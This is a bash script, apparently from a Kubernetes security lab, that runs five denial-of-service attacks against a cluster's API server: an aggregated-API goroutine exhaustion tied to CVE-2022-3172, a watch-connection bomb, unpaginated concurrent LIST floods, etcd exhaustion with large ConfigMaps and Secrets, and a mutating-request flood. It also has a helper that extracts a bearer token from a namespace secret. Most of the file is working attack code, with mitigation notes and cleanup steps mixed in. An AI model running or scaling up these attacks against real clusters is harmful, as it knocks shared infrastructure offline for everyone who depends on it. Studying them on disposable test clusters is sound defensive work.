#!/usr/bin/env bash
# =============================================================================
# API Server Denial of Service Demonstrations
# =============================================================================
#
# PURPOSE: Demonstrates multiple techniques for overwhelming or crashing the
# Kubernetes API server. Each technique exploits a different aspect of the
# API server's design.
#
# TECHNIQUES:
#   1. CVE-2022-3172 - Aggregated API Server DoS
#   2. Watch connection bomb
#   3. Expensive LIST requests without pagination
#   4. OOM via large object creation
#   5. Concurrent request flooding
#
# PREREQUISITES:
#   - Vulnerable Kind cluster running
#   - kubectl configured
#   - curl installed
#
# WARNING: These attacks WILL degrade or crash the API server.
# Run ONLY on disposable test clusters.
#
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
NAMESPACE="insecure-ns"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

log_info()    { echo -e "${GREEN}[INFO]${NC}    $*"; }
log_warn()    { echo -e "${YELLOW}[WARN]${NC}    $*"; }
log_error()   { echo -e "${RED}[ERROR]${NC}   $*"; }
log_attack()  { echo -e "${RED}[ATTACK]${NC}  $*"; }
log_explain() { echo -e "${CYAN}[EXPLAIN]${NC} $*"; }
log_cmd()     { echo -e "${MAGENTA}[CMD]${NC}     $*"; }
log_cve()     { echo -e "${RED}[CVE]${NC}     $*"; }

section() {
    echo ""
    echo -e "${BLUE}=================================================================${NC}"
    echo -e "${BLUE} $*${NC}"
    echo -e "${BLUE}=================================================================${NC}"
    echo ""
}

pause() {
    echo ""
    echo -e "${YELLOW}Press Enter to continue to the next attack...${NC}"
    read -r
}

# Get API server URL
get_api_server() {
    kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}' 2>/dev/null || echo "https://localhost:6443"
}

# Get bearer token
get_token() {
    kubectl config view --minify -o jsonpath='{.users[0].user.token}' 2>/dev/null || \
    kubectl get secret -n insecure-ns -o jsonpath='{.items[0].data.token}' 2>/dev/null | base64 -d || \
    echo ""
}

# =============================================================================
# ATTACK 1: CVE-2022-3172 - Aggregated API Server DoS
# =============================================================================

attack_cve_2022_3172() {
    section "ATTACK 1: CVE-2022-3172 - Aggregated API Server DoS"

    log_cve "CVE-2022-3172 (CVSS 8.2)"
    echo ""
    echo "  Description: The API server can be configured to redirect requests"
    echo "  to aggregated API servers. A malicious aggregated API can redirect"
    echo "  the kube-apiserver to arbitrary URLs, causing it to make requests"
    echo "  to unexpected endpoints."
    echo ""
    echo "  Impact: The API server wastes resources following redirects, which"
    echo "  can be amplified to cause denial of service. It can also leak"
    echo "  authentication credentials to the redirect target."
    echo ""

    log_attack "Step 1: Create a malicious APIService that redirects to an external URL"
    log_explain "In a real attack, this would redirect to a slow endpoint that"
    log_explain "causes API server goroutines to hang, exhausting resources."
    echo ""

    log_cmd "kubectl apply -f - (APIService pointing to non-existent backend)"
    kubectl apply -f - <<'EOF' 2>/dev/null || true
apiVersion: apiregistration.k8s.io/v1
kind: APIService
metadata:
  name: v1alpha1.dos-demo.example.com
spec:
  # VULNERABLE: Points to a service that does not exist or is malicious
  service:
    name: dos-demo-service
    namespace: insecure-ns
  group: dos-demo.example.com
  version: v1alpha1
  # Low priority to not interfere with real APIs
  groupPriorityMinimum: 100
  versionPriority: 100
  # VULNERABLE: Skip TLS verification
  insecureSkipTLSVerify: true
EOF
    echo ""

    log_attack "Step 2: Send requests to the aggregated API"
    log_explain "These requests are forwarded by the API server to the (non-existent)"
    log_explain "backend service. Each request consumes a goroutine that waits for"
    log_explain "the timeout, exhausting API server resources."
    echo ""

    local api_server
    api_server=$(get_api_server)

    log_cmd "Sending requests to aggregated API (will timeout)..."
    for i in {1..5}; do
        kubectl get --raw "/apis/dos-demo.example.com/v1alpha1/resources" &>/dev/null &
        echo "  Sent request $i (backgrounded, will timeout)"
    done
    echo ""
    log_explain "Each request occupies an API server goroutine until timeout."
    log_explain "With enough concurrent requests, the API server runs out of goroutines."
    echo ""

    # Clean up the APIService
    kubectl delete apiservice v1alpha1.dos-demo.example.com 2>/dev/null || true
    wait 2>/dev/null || true  # Wait for background requests

    log_warn "IMPACT: API server goroutine exhaustion leading to unresponsiveness."
    log_warn "MITIGATION: Update to patched K8s version, limit aggregated API services."
}

# =============================================================================
# ATTACK 2: Watch Connection Bomb
# =============================================================================

attack_watch_bomb() {
    section "ATTACK 2: Watch Connection Bomb"

    log_explain "The Kubernetes watch mechanism allows clients to receive real-time"
    log_explain "updates about resource changes. Each watch consumes server memory"
    log_explain "and CPU for event processing."
    echo ""
    log_explain "By opening thousands of watch connections, an attacker can exhaust"
    log_explain "API server memory and CPU, causing it to become unresponsive or crash."
    echo ""

    log_attack "Step 1: Open multiple watch connections"
    log_explain "Each watch connection consumes ~100KB of API server memory."
    log_explain "1000 watches = ~100MB, 10000 watches = ~1GB"
    echo ""

    local watch_pids=()
    local watch_count=50  # Reduced for safety in demo

    log_cmd "Opening ${watch_count} concurrent watch connections..."
    for i in $(seq 1 "${watch_count}"); do
        # Open a watch connection on pods (returns a stream)
        kubectl get pods -A --watch --request-timeout=30s &>/dev/null &
        watch_pids+=($!)
        if (( i % 10 == 0 )); then
            echo "  Opened $i watch connections..."
        fi
    done
    echo ""

    log_attack "Step 2: Monitor API server resource usage"
    log_cmd "kubectl top pod -n kube-system (if metrics-server is available)"
    kubectl top pod -n kube-system 2>/dev/null || echo "  (metrics-server not available - install for resource monitoring)"
    echo ""

    log_attack "Step 3: Test API server responsiveness"
    log_cmd "time kubectl get nodes"
    local start_time end_time
    start_time=$(date +%s%N)
    kubectl get nodes &>/dev/null || true
    end_time=$(date +%s%N)
    local duration_ms=$(( (end_time - start_time) / 1000000 ))
    echo "  API response time: ${duration_ms}ms"

    if (( duration_ms > 5000 )); then
        log_warn "API server is slow (${duration_ms}ms). The watch bomb is working."
    else
        log_info "API server responded in ${duration_ms}ms (still healthy with ${watch_count} watches)."
        log_info "In a real attack, tens of thousands of watches would be opened."
    fi
    echo ""

    # Clean up watch connections
    log_info "Cleaning up watch connections..."
    for pid in "${watch_pids[@]}"; do
        kill "$pid" 2>/dev/null || true
    done
    wait 2>/dev/null || true
    echo ""

    log_warn "IMPACT: API server memory exhaustion and degraded performance."
    log_warn "At scale, this causes OOM kills and API server crashes."
    echo ""
    echo "  MITIGATION:"
    echo "  - Configure API Priority and Fairness (APF)"
    echo "  - Set --max-requests-inflight and --max-mutating-requests-inflight"
    echo "  - Use network policies to restrict API server access"
    echo "  - Monitor watch connection count in API server metrics"
}

# =============================================================================
# ATTACK 3: Expensive LIST Requests (No Pagination)
# =============================================================================

attack_expensive_list() {
    section "ATTACK 3: Expensive LIST Requests Without Pagination"

    log_explain "LIST requests without pagination (limit parameter) force the"
    log_explain "API server to load ALL objects of a type into memory at once."
    log_explain "This is especially dangerous for large clusters with many pods,"
    log_explain "events, or secrets."
    echo ""
    log_explain "A single LIST of all events in a busy cluster can consume"
    log_explain "hundreds of MB of API server memory."
    echo ""

    # First, create some objects to make LISTs more expensive
    log_attack "Step 1: Create many objects to increase LIST cost"
    log_cmd "Creating 100 ConfigMaps to increase LIST payload size..."

    local cm_count=100
    for i in $(seq 1 "${cm_count}"); do
        # Create ConfigMaps with some data to increase response size
        kubectl create configmap "flood-cm-${i}" \
            --from-literal="data=$(head -c 1024 /dev/urandom | base64)" \
            -n "${NAMESPACE}" 2>/dev/null || true
        if (( i % 25 == 0 )); then
            echo "  Created $i ConfigMaps..."
        fi
    done
    echo ""

    log_attack "Step 2: Perform expensive LIST without pagination"
    log_explain "Without ?limit=N, the API server must serialize ALL objects."
    echo ""

    log_cmd "kubectl get configmaps -A -o json | wc -c (measuring response size)"
    local response_size
    response_size=$(kubectl get configmaps -A -o json 2>/dev/null | wc -c || echo "0")
    echo "  Total response size: ${response_size} bytes"
    echo ""

    log_attack "Step 3: Fire multiple concurrent LIST requests"
    log_explain "Multiple concurrent large LIST requests multiply the memory impact."
    echo ""

    local list_pids=()
    for i in {1..10}; do
        kubectl get configmaps -A -o json &>/dev/null &
        list_pids+=($!)
    done
    echo "  Fired 10 concurrent LIST requests for ALL ConfigMaps across ALL namespaces."
    echo ""

    # Wait and measure
    log_attack "Step 4: Measure API server impact"
    local start_time end_time
    start_time=$(date +%s%N)
    kubectl get nodes &>/dev/null || true
    end_time=$(date +%s%N)
    local duration_ms=$(( (end_time - start_time) / 1000000 ))
    echo "  API response time during flood: ${duration_ms}ms"
    echo ""

    # Wait for background processes
    for pid in "${list_pids[@]}"; do
        wait "$pid" 2>/dev/null || true
    done

    # Clean up
    log_info "Cleaning up ConfigMaps..."
    for i in $(seq 1 "${cm_count}"); do
        kubectl delete configmap "flood-cm-${i}" -n "${NAMESPACE}" 2>/dev/null &
    done
    wait 2>/dev/null || true
    echo ""

    log_warn "IMPACT: API server memory spikes, potential OOM."
    log_warn "In production with millions of events, a single LIST can use GB of RAM."
    echo ""
    echo "  MITIGATION:"
    echo "  - Enforce pagination (client-side and server-side limits)"
    echo "  - Configure --default-watch-cache-size"
    echo "  - Use API Priority and Fairness to limit expensive requests"
    echo "  - Set ResourceQuota to limit object count per namespace"
}

# =============================================================================
# ATTACK 4: OOM via Large Object Creation
# =============================================================================

attack_large_objects() {
    section "ATTACK 4: OOM via Large Object Creation"

    log_explain "Kubernetes allows objects up to ~1.5MB per object (etcd limit)."
    log_explain "By creating many large objects, an attacker can exhaust both"
    log_explain "API server and etcd memory, causing OOM crashes."
    echo ""

    log_attack "Step 1: Create large ConfigMaps (approaching etcd size limit)"
    log_explain "Each ConfigMap can hold up to ~1MB of data."
    log_explain "Creating 50 x 500KB ConfigMaps = ~25MB in etcd."
    echo ""

    local large_cm_count=20  # Reduced for demo safety
    local data_size=512000   # ~500KB per ConfigMap

    for i in $(seq 1 "${large_cm_count}"); do
        # Generate random data of specified size
        local data
        data=$(head -c "${data_size}" /dev/urandom | base64 | head -c "${data_size}")
        kubectl create configmap "large-cm-${i}" \
            --from-literal="payload=${data}" \
            -n "${NAMESPACE}" 2>/dev/null || {
                log_warn "Failed to create ConfigMap ${i} (etcd may be saturated)"
                break
            }
        if (( i % 5 == 0 )); then
            echo "  Created $i large ConfigMaps (~$((data_size * i / 1024))KB total in etcd)..."
        fi
    done
    echo ""

    log_attack "Step 2: Create large Secrets (also stored in etcd)"
    log_explain "Secrets are base64-encoded in etcd, making them ~33% larger."
    echo ""

    local secret_count=10
    for i in $(seq 1 "${secret_count}"); do
        local data
        data=$(head -c 262144 /dev/urandom | base64 | head -c 262144)
        kubectl create secret generic "large-secret-${i}" \
            --from-literal="payload=${data}" \
            -n "${NAMESPACE}" 2>/dev/null || {
                log_warn "Failed to create Secret ${i}"
                break
            }
        if (( i % 5 == 0 )); then
            echo "  Created $i large Secrets..."
        fi
    done
    echo ""

    log_attack "Step 3: Check etcd and API server health"
    log_cmd "kubectl get componentstatuses"
    kubectl get componentstatuses 2>/dev/null || kubectl get --raw='/healthz' 2>/dev/null || true
    echo ""

    log_cmd "kubectl get --raw='/healthz?verbose' | tail -5"
    kubectl get --raw='/healthz?verbose' 2>/dev/null | tail -5 || true
    echo ""

    # Clean up
    log_info "Cleaning up large objects..."
    for i in $(seq 1 "${large_cm_count}"); do
        kubectl delete configmap "large-cm-${i}" -n "${NAMESPACE}" 2>/dev/null &
    done
    for i in $(seq 1 "${secret_count}"); do
        kubectl delete secret "large-secret-${i}" -n "${NAMESPACE}" 2>/dev/null &
    done
    wait 2>/dev/null || true
    echo ""

    log_warn "IMPACT: etcd memory exhaustion, performance degradation, potential crash."
    log_warn "etcd has a default database size limit (2GB by default, 8GB max)."
    echo ""
    echo "  MITIGATION:"
    echo "  - Set ResourceQuota to limit object count and total storage"
    echo "  - Set LimitRange to limit individual object sizes"
    echo "  - Monitor etcd database size (etcd_db_total_size_in_bytes)"
    echo "  - Configure etcd --quota-backend-bytes"
}

# =============================================================================
# ATTACK 5: Concurrent Mutating Request Flood
# =============================================================================

attack_mutating_flood() {
    section "ATTACK 5: Concurrent Mutating Request Flood"

    log_explain "The API server has limits on concurrent requests, but the defaults"
    log_explain "may be too high. Flooding with mutating requests (CREATE, UPDATE,"
    log_explain "DELETE) is especially expensive because each one must:"
    log_explain "  1. Pass admission control (webhooks)"
    log_explain "  2. Be validated"
    log_explain "  3. Be written to etcd (consensus required)"
    log_explain "  4. Trigger watch notifications to all watchers"
    echo ""

    log_attack "Step 1: Flood with namespace creation requests"
    log_explain "Namespace creation is expensive because it triggers multiple"
    log_explain "controller reconciliation loops."
    echo ""

    local ns_count=50
    log_cmd "Creating ${ns_count} namespaces concurrently..."
    for i in $(seq 1 "${ns_count}"); do
        kubectl create namespace "flood-ns-${i}" 2>/dev/null &
    done
    wait 2>/dev/null || true
    echo "  Created (or attempted) ${ns_count} namespaces."
    echo ""

    log_attack "Step 2: Measure API server response time during flood"
    local start_time end_time

    # Fire another batch while measuring
    for i in $(seq 1 20); do
        kubectl create configmap "flood-${i}" --from-literal=data=test -n "${NAMESPACE}" 2>/dev/null &
    done

    start_time=$(date +%s%N)
    kubectl get nodes &>/dev/null || true
    end_time=$(date +%s%N)
    local duration_ms=$(( (end_time - start_time) / 1000000 ))
    echo "  API response time during mutation flood: ${duration_ms}ms"
    echo ""

    wait 2>/dev/null || true

    # Clean up
    log_info "Cleaning up flood resources..."
    for i in $(seq 1 "${ns_count}"); do
        kubectl delete namespace "flood-ns-${i}" 2>/dev/null &
    done
    for i in $(seq 1 20); do
        kubectl delete configmap "flood-${i}" -n "${NAMESPACE}" 2>/dev/null &
    done
    wait 2>/dev/null || true
    echo ""

    log_warn "IMPACT: API server and etcd saturation, increased latency for all clients."
    log_warn "Critical operations (pod scheduling, health checks) are delayed."
    echo ""
    echo "  MITIGATION:"
    echo "  - Configure --max-mutating-requests-inflight (default: 200)"
    echo "  - Use API Priority and Fairness to protect system-critical requests"
    echo "  - Set ResourceQuota on namespace creation"
    echo "  - Use rate-limiting admission webhooks"
}

# =============================================================================
# Summary
# =============================================================================

print_summary() {
    section "Summary of API Server DoS Techniques"

    echo -e "${RED}Attack Techniques Demonstrated:${NC}"
    echo ""
    echo "  1. CVE-2022-3172     : Aggregated API redirect abuse"
    echo "  2. Watch bomb         : Exhaust memory with watch connections"
    echo "  3. Expensive LISTs   : Full-table scans without pagination"
    echo "  4. Large objects      : Fill etcd with oversized objects"
    echo "  5. Mutation flood     : Overwhelm with concurrent writes"
    echo ""
    echo -e "${GREEN}Key Mitigations:${NC}"
    echo ""
    echo "  - API Priority and Fairness (APF)"
    echo "  - --max-requests-inflight and --max-mutating-requests-inflight"
    echo "  - ResourceQuota per namespace"
    echo "  - LimitRange for object sizes"
    echo "  - Network policies restricting API server access"
    echo "  - Audit logging to detect abnormal patterns"
    echo "  - etcd quotas and monitoring"
    echo ""
    echo "  See mitigation.md for comprehensive protection strategies."
    echo ""
}

# =============================================================================
# Usage and Main
# =============================================================================

usage() {
    echo "Usage: $0 [ATTACK_NUMBER]"
    echo ""
    echo "Attacks:"
    echo "  1      CVE-2022-3172 Aggregated API DoS"
    echo "  2      Watch connection bomb"
    echo "  3      Expensive LIST requests"
    echo "  4      Large object OOM"
    echo "  5      Concurrent mutation flood"
    echo "  all    Run all attacks (default)"
    echo ""
    echo "Options:"
    echo "  --help   Show this help message"
    echo ""
}

main() {
    local attack="${1:-all}"

    echo -e "${RED}"
    echo "============================================================"
    echo " API SERVER DENIAL OF SERVICE DEMONSTRATIONS"
    echo " FOR AUTHORIZED SECURITY TESTING ONLY"
    echo " WARNING: These attacks WILL degrade API server performance"
    echo "============================================================"
    echo -e "${NC}"

    case "$attack" in
        1) attack_cve_2022_3172 ;;
        2) attack_watch_bomb ;;
        3) attack_expensive_list ;;
        4) attack_large_objects ;;
        5) attack_mutating_flood ;;
        all)
            attack_cve_2022_3172
            pause
            attack_watch_bomb
            pause
            attack_expensive_list
            pause
            attack_large_objects
            pause
            attack_mutating_flood
            print_summary
            ;;
        help|--help|-h) usage ;;
        *) echo "Unknown attack: $attack"; usage; exit 1 ;;
    esac
}

main "$@"
